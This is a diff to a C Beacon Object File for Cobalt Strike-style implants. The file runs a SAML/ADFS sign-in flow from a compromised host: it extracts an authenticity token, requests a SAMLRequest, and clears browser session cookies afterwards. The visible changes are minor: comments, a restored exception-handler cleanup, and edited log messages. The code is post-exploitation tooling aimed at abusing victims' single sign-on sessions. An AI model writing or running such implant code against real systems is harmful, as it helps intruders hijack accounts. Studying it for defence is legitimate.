@@ -79,8 +79,9 @@ extern "C" {
     LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
     unsigned __stdcall performSAML(void* p);
 
-
+    // ==================== Entry Point ====================
     void go(PCHAR args, int len) {
+        //Using a vectored exception handler, just because if anything weird does happen related to memory i dont want this to crash the beacon
         DWORD exitcode = 0;
         HANDLE thread = NULL;
         PVOID eHandler = NULL;
@@ -93,9 +94,10 @@ extern "C" {
             BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x\n", exitcode);
         }
         if (thread) { CloseHandle(thread); }
-        //if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
+        if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
     }
-    // ==================== MAIN ENTRY POINT ====================
+
+    // ==================== Main Function ====================
     unsigned __stdcall performSAML(void* p) {
         // Initialize all variables at the top to avoid goto issues
         char* base64TokenForAdfs = NULL;
@@ -140,7 +142,7 @@ extern "C" {
             BeaconPrintf(CALLBACK_ERROR, "[!] REQUEST 1 FAILED: Could not extract authenticity_token");
             goto cleanup;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token TESTING");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] REQUEST 1 SUCCESS: Extracted authenticity_token");
 
         // ==================== REQUEST 2: POST SAML Authentication ====================
         BeaconPrintf(CALLBACK_OUTPUT, "[*] REQUEST 2: POST Request for SAMLRequest token");
@@ -1033,9 +1035,7 @@ extern "C" {
         if (!InternetSetOption(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0)) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Failed to clear session (Error: %lu)", GetLastError());
         }
-        else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] All cookies and session data cleared");
-        }
+
     }
 
 
